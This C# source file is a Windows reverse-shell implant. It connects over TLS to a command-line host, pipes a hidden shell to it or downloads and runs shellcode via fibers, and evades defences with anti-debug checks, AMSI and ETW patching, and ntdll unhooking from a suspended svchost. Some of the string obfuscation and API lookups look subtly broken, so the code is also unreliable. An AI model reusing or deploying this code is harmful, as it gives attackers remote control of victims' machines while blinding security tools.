using System;
using System.Buffers;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Authentication;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ReverseShellGui
{
    internal static class Program
    {
        private static StreamWriter streamWriter;

        // String obfuscation key (change this for each build)
        private const int XOR_KEY = 0x5A;

        // Fiber execution
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr ConvertThreadToFiber(IntPtr lpParameter);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateFiber(uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);

        [DllImport("kernel32.dll")]
        private static extern void SwitchToFiber(IntPtr lpFiber);

        // For ETW bypass and LdrLoadDll patch
        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        // For suspended process
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        private static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool TerminateProcess(IntPtr hProcess, uint uExitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        private const uint CREATE_SUSPENDED = 0x00000004;
        private const uint PAGE_READWRITE = 0x04;

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        // String obfuscation/decoding
        private static string Decode(string encoded)
        {
            var sb = new StringBuilder(encoded.Length);
            foreach (char c in encoded)
            {
                sb.Append((char)(c ^ XOR_KEY));
            }
            return sb.ToString();
        }

        [STAThread]
        private static void Main(string[] args)
        {
            // Anti-debug
            if (IsDebuggerPresent()) Environment.Exit(0);

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new HiddenApplicationContext());
        }

        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();

        private class HiddenApplicationContext : ApplicationContext
        {
            public HiddenApplicationContext()
            {
                Task.Run(() => RunReverseShell());
            }

            private async void RunReverseShell()
            {
                try
                {
                    string[] args = Environment.GetCommandLineArgs();
                    if (args.Length < 6) return;

                    string host = args[1];
                    int port = int.Parse(args[2]);
                    string envvar = args[3];
                    string arguments = args[4];
                    int xorkey = int.Parse(args[5]);

                    bool shellcodeMode = args.Length > 6 && args[6].Equals("--shellcode", StringComparison.OrdinalIgnoreCase);

                    string command = "";
                    for (int i = 0; i < envvar.Length; i++)
                    {
                        command += (char)(envvar[i] ^ xorkey);
                    }

                    // Enhanced AMSI Bypass: Prevent amsi.dll loading + reflection fallback
                    try
                    {
                        // Patch LdrLoadDll to block "amsi.dll" (simplified; full impl would check param)
                        var kernel = LoadLibrary(Decode("\x7a\x6f\x72\x6e\x65\x6c\x33\x32\x2e\x64\x6c\x6c")); // "kernel32.dll"
                        var ldrAddr = GetProcAddress(kernel, Decode("\x4c\x64\x72\x4c\x6f\x61\x64\x44\x6c\x6c")); // "LdrLoadDll"
                        if (ldrAddr != IntPtr.Zero)
                        {
                            uint oldProt;
                            VirtualProtect(ldrAddr, (UIntPtr)1, 0x40, out oldProt);
                            Marshal.WriteByte(ldrAddr, 0xC3); // ret
                            VirtualProtect(ldrAddr, (UIntPtr)1, oldProt, out oldProt);
                        }
                    }
                    catch { }

                    // Reflection fallback
                    try
                    {
                        var amsiUtilsType = Type.GetType(Decode("\x53\x79\x73\x74\x65\x6d\x2e\x4d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2e\x41\x75\x74\x6f\x6d\x61\x74\x69\x6f\x6e\x2e\x41\x6d\x73\x69\x55\x74\x69\x6c\x73\x2c\x20\x53\x79\x73\x74\x65\x6d\x2e\x4d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2e\x41\x75\x74\x6f\x6d\x61\x74\x69\x6f\x6e\x2c\x20\x56\x65\x72\x73\x69\x6f\x6e\x3d\x33\x2e\x30\x2e\x30\x2e\x30\x2c\x20\x43\x75\x6c\x74\x75\x72\x65\x3d\x6e\x65\x75\x74\x72\x61\x6c\x2c\x20\x50\x75\x62\x6c\x69\x63\x4b\x65\x79\x54\x6f\x6b\x65\x6e\x3d\x33\x31\x62\x66\x33\x38\x35\x36\x61\x64\x33\x36\x34\x65\x33\x35"));
                        if (amsiUtilsType == null)
                        {
                            amsiUtilsType = AppDomain.CurrentDomain.GetAssemblies()
                                .SelectMany(a => a.GetTypes())
                                .FirstOrDefault(t => t.FullName == Decode("\x53\x79\x73\x74\x65\x6d\x2e\x4d\x61\x6e\x61\x67\x65\x6d\x65\x6e\x74\x2e\x41\x75\x74\x6f\x6d\x61\x74\x69\x6f\x6e\x2e\x41\x6d\x73\x69\x55\x74\x69\x6c\x73"));
                        }

                        if (amsiUtilsType != null)
                        {
                            var field = amsiUtilsType.GetField(Decode("\x61\x6d\x73\x69\x49\x6e\x69\x74\x46\x61\x69\x6c\x65\x64"), BindingFlags.NonPublic | BindingFlags.Static);
                            if (field != null) field.SetValue(null, true);
                        }
                    }
                    catch { }

                    // ETW Bypass
                    try
                    {
                        var ntdll = LoadLibrary(Decode("\x6e\x74\x64\x6c\x6c\x2e\x64\x6c\x6c"));
                        var etwAddr = GetProcAddress(ntdll, Decode("\x45\x74\x77\x45\x76\x65\x6e\x74\x57\x72\x69\x74\x65"));
                        if (etwAddr != IntPtr.Zero)
                        {
                            uint oldProtect;
                            VirtualProtect(etwAddr, (UIntPtr)1, 0x40, out oldProtect);
                            Marshal.WriteByte(etwAddr, 0xC3);
                            VirtualProtect(etwAddr, (UIntPtr)1, oldProtect, out oldProtect);
                        }
                    }
                    catch { }

                    using (TcpClient client = new TcpClient(host, port))
                    using (SslStream sslStream = new SslStream(
                        client.GetStream(),
                        false,
                        new RemoteCertificateValidationCallback(ValidateServerCertificate),
                        null))
                    {
                        sslStream.AuthenticateAsClient(host);

                        if (shellcodeMode)
                        {
                            // Receive shellcode with ArrayPool
                            byte[] lenBuf = new byte[4];
                            await sslStream.ReadAsync(lenBuf, 0, 4);
                            uint scLen = BitConverter.ToUInt32(lenBuf, 0);

                            if (scLen == 0 || scLen > 5 * 1024 * 1024) throw new Exception("Invalid length");

                            byte[] rentedBuffer = ArrayPool<byte>.Shared.Rent((int)scLen);
                            try
                            {
                                int read = 0;
                                while (read < (int)scLen)
                                {
                                    read += await sslStream.ReadAsync(rentedBuffer, read, (int)scLen - read);
                                }

                                // Optional: XOR decrypt shellcode (match server)
                                for (int i = 0; i < scLen; i++)
                                    rentedBuffer[i] ^= 0xAA;

                                // Allocate RWX memory using indirect syscalls
                                IntPtr baseAddr = IntPtr.Zero;
                                uint regionSize = scLen;
                                IntPtr allocResult = IndirectSyscalls.NtAllocateVirtualMemory(
                                    (IntPtr)(-1),
                                    ref baseAddr,
                                    IntPtr.Zero,
                                    ref regionSize,
                                    0x1000 | 0x2000,
                                    0x40
                                );
                                if (allocResult != IntPtr.Zero) throw new Exception("Alloc failed");

                                // Write shellcode
                                uint bytesWritten;
                                IndirectSyscalls.NtWriteVirtualMemory(
                                    (IntPtr)(-1),
                                    baseAddr,
                                    rentedBuffer,
                                    scLen,
                                    out bytesWritten
                                );
                                if (bytesWritten != scLen) throw new Exception("Write failed");

                                // Fiber execution
                                IntPtr primaryFiber = ConvertThreadToFiber(IntPtr.Zero);
                                if (primaryFiber == IntPtr.Zero) throw new Exception("Fiber failed");

                                IntPtr scFiber = CreateFiber(0, baseAddr, IntPtr.Zero);
                                if (scFiber == IntPtr.Zero) throw new Exception("CreateFiber failed");

                                SwitchToFiber(scFiber);
                            }
                            finally
                            {
                                ArrayPool<byte>.Shared.Return(rentedBuffer);
                            }
                        }
                        else
                        {
                            // Normal reverse shell mode
                            streamWriter = new StreamWriter(sslStream, Encoding.UTF8) { AutoFlush = true };
                            streamWriter.Flush();

                            Process process = new Process
                            {
                                StartInfo = new ProcessStartInfo
                                {
                                    FileName = command,
                                    Arguments = arguments,
                                    UseShellExecute = false,
                                    RedirectStandardOutput = true,
                                    RedirectStandardError = true,
                                    RedirectStandardInput = true,
                                    CreateNoWindow = true,
                                    WindowStyle = ProcessWindowStyle.Hidden
                                }
                            };

                            process.OutputDataReceived += CmdOutputDataHandler;
                            process.ErrorDataReceived += CmdErrorDataHandler;

                            process.Start();

                            process.BeginOutputReadLine();
                            process.BeginErrorReadLine();

                            using (StreamReader reader = new StreamReader(sslStream, Encoding.UTF8))
                            {
                                string line;
                                while ((line = await reader.ReadLineAsync()) != null)
                                {
                                    process.StandardInput.WriteLine(line);
                                    process.StandardInput.Flush();
                                }
                            }

                            process.Kill();
                        }
                    }
                }
                catch
                {
                    // Silent
                }
                finally
                {
                    Application.Exit();
                }
            }
        }

        public static bool ValidateServerCertificate(
            object sender,
            X509Certificate certificate,
            X509Chain chain,
            SslPolicyErrors sslPolicyErrors)
        {
            return true;
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (!string.IsNullOrEmpty(outLine.Data) && streamWriter != null)
            {
                try
                {
                    streamWriter.WriteLine(outLine.Data);
                    streamWriter.Flush();
                }
                catch { }
            }
        }

        private static void CmdErrorDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            if (!string.IsNullOrEmpty(outLine.Data) && streamWriter != null)
            {
                try
                {
                    streamWriter.WriteLine(outLine.Data);
                    streamWriter.Flush();
                }
                catch { }
            }
        }

        // Indirect Syscalls with Selective Unhooking using Suspended Process (svchost.exe for stealth)
        private static class IndirectSyscalls
        {
            private static IntPtr ntdllHandle;

            static IndirectSyscalls()
            {
                ntdllHandle = LoadLibrary(Decode("\x6e\x74\x64\x6c\x6c\x2e\x64\x6c\x6c"));

                STARTUPINFO si = new STARTUPINFO { cb = (uint)Marshal.SizeOf<STARTUPINFO>() };
                PROCESS_INFORMATION pi;
                bool created = CreateProcess(null, Decode("\x73\x76\x63\x68\x6f\x73\x74\x2e\x65\x78\x65"), IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
                if (!created) return;

                try
                {
                    Process suspendedProc = Process.GetProcessById((int)pi.dwProcessId);
                    IntPtr remoteNtdllBase = IntPtr.Zero;
                    uint moduleSize = 0;
                    foreach (ProcessModule module in suspendedProc.Modules)
                    {
                        if (module.ModuleName.Equals("ntdll.dll", StringComparison.OrdinalIgnoreCase))
                        {
                            remoteNtdllBase = module.BaseAddress;
                            moduleSize = (uint)module.ModuleMemorySize;
                            break;
                        }
                    }

                    if (remoteNtdllBase == IntPtr.Zero || moduleSize == 0) return;

                    byte[] cleanNtdll = new byte[moduleSize];
                    uint bytesRead;
                    bool readSuccess = ReadProcessMemory(pi.hProcess, remoteNtdllBase, cleanNtdll, moduleSize, out bytesRead);
                    if (!readSuccess || bytesRead != moduleSize) return;

                    UnhookSyscall(cleanNtdll, Decode("\x4e\x74\x41\x6c\x6c\x6f\x63\x61\x74\x65\x56\x69\x72\x74\x75\x61\x6c\x4d\x65\x6d\x6f\x72\x79"));
                    UnhookSyscall(cleanNtdll, Decode("\x4e\x74\x57\x72\x69\x74\x65\x56\x69\x72\x74\x75\x61\x6c\x4d\x65\x6d\x6f\x72\x79"));
                }
                finally
                {
                    TerminateProcess(pi.hProcess, 0);
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                }
            }

            private static void UnhookSyscall(byte[] cleanNtdll, string funcName)
            {
                uint rva = GetExportRVA(cleanNtdll, funcName);
                if (rva == 0) return;

                IntPtr localFuncAddr = GetProcAddress(ntdllHandle, funcName);
                if (localFuncAddr == IntPtr.Zero) return;

                const uint stubSize = 32;
                byte[] cleanStub = new byte[stubSize];
                Buffer.BlockCopy(cleanNtdll, (int)rva, cleanStub, 0, (int)stubSize);

                uint oldProtect;
                VirtualProtect(localFuncAddr, (UIntPtr)stubSize, PAGE_READWRITE, out oldProtect);

                uint bytesWritten;
                WriteProcessMemory((IntPtr)(-1), localFuncAddr, cleanStub, stubSize, out bytesWritten);

                VirtualProtect(localFuncAddr, (UIntPtr)stubSize, oldProtect, out oldProtect);
            }

            // PE parsing for export RVA (unchanged)
            private static uint GetExportRVA(byte[] peBytes, string exportName)
            {
                if (peBytes.Length < 0x3C + 4) return 0;

                int e_lfanew = BitConverter.ToInt32(peBytes, 0x3C);
                if (e_lfanew + 0x18 + 0x70 > peBytes.Length) return 0;

                if (BitConverter.ToUInt32(peBytes, e_lfanew) != 0x4550) return 0;

                ushort optSize = BitConverter.ToUInt16(peBytes, e_lfanew + 0x14);
                int optHeader = e_lfanew + 0x18;

                ushort magic = BitConverter.ToUInt16(peBytes, optHeader);
                int dataDirOffset = (magic == 0x20B) ? 0x6C : 0x60;

                uint numDataDirs = BitConverter.ToUInt32(peBytes, optHeader + dataDirOffset);
                if (numDataDirs < 1) return 0;

                uint exportDirRVA = BitConverter.ToUInt32(peBytes, optHeader + dataDirOffset + 4);
                uint exportDirSize = BitConverter.ToUInt32(peBytes, optHeader + dataDirOffset + 8);

                if (exportDirRVA == 0 || exportDirSize == 0) return 0;

                int exportDir = (int)exportDirRVA;

                uint numberOfNames = BitConverter.ToUInt32(peBytes, exportDir + 0x18);
                uint addressOfFunctions = BitConverter.ToUInt32(peBytes, exportDir + 0x1C);
                uint addressOfNames = BitConverter.ToUInt32(peBytes, exportDir + 0x20);
                uint addressOfNameOrdinals = BitConverter.ToUInt32(peBytes, exportDir + 0x24);

                for (uint i = 0; i < numberOfNames; i++)
                {
                    uint nameRVA = BitConverter.ToUInt32(peBytes, (int)(addressOfNames + i * 4));
                    string name = GetString(peBytes, (int)nameRVA);

                    if (name == exportName)
                    {
                        ushort ordinal = BitConverter.ToUInt16(peBytes, (int)(addressOfNameOrdinals + i * 2));
                        uint funcRVA = BitConverter.ToUInt32(peBytes, (int)(addressOfFunctions + ordinal * 4));
                        return funcRVA;
                    }
                }

                return 0;
            }

            private static string GetString(byte[] bytes, int offset)
            {
                int len = 0;
                while (bytes[offset + len] != 0) len++;
                return Encoding.ASCII.GetString(bytes, offset, len);
            }

            // Delegates
            public delegate IntPtr NtAllocateVirtualMemoryDelegate(
                IntPtr ProcessHandle,
                ref IntPtr BaseAddress,
                IntPtr ZeroBits,
                ref uint RegionSize,
                uint AllocationType,
                uint Protect);

            public delegate IntPtr NtWriteVirtualMemoryDelegate(
                IntPtr ProcessHandle,
                IntPtr BaseAddress,
                IntPtr Buffer,
                uint BufferSize,
                out uint BytesWritten);

            public static IntPtr NtAllocateVirtualMemory(
                IntPtr ProcessHandle,
                ref IntPtr BaseAddress,
                IntPtr ZeroBits,
                ref uint RegionSize,
                uint AllocationType,
                uint Protect)
            {
                IntPtr gate = GetProcAddress(ntdllHandle, Decode("\x4e\x74\x41\x6c\x6c\x6f\x63\x61\x74\x65\x56\x69\x72\x74\x75\x61\x6c\x4d\x65\x6d\x6f\x72\x79"));
                if (gate == IntPtr.Zero) return (IntPtr)(-1);

                var syscallFunc = (NtAllocateVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(
                    gate, typeof(NtAllocateVirtualMemoryDelegate));

                return syscallFunc(ProcessHandle, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
            }

            public static IntPtr NtWriteVirtualMemory(
                IntPtr ProcessHandle,
                IntPtr BaseAddress,
                byte[] Buffer,
                uint BufferSize,
                out uint BytesWritten)
            {
                IntPtr gate = GetProcAddress(ntdllHandle, Decode("\x4e\x74\x57\x72\x69\x74\x65\x56\x69\x72\x74\x75\x61\x6c\x4d\x65\x6d\x6f\x72\x79"));
                if (gate == IntPtr.Zero)
                {
                    BytesWritten = 0;
                    return (IntPtr)(-1);
                }

                var syscallFunc = (NtWriteVirtualMemoryDelegate)Marshal.GetDelegateForFunctionPointer(
                    gate, typeof(NtWriteVirtualMemoryDelegate));

                GCHandle handle = GCHandle.Alloc(Buffer, GCHandleType.Pinned);
                try
                {
                    return syscallFunc(ProcessHandle, BaseAddress, handle.AddrOfPinnedObject(), BufferSize, out BytesWritten);
                }
                finally
                {
                    handle.Free();
                }
            }
        }
    }
}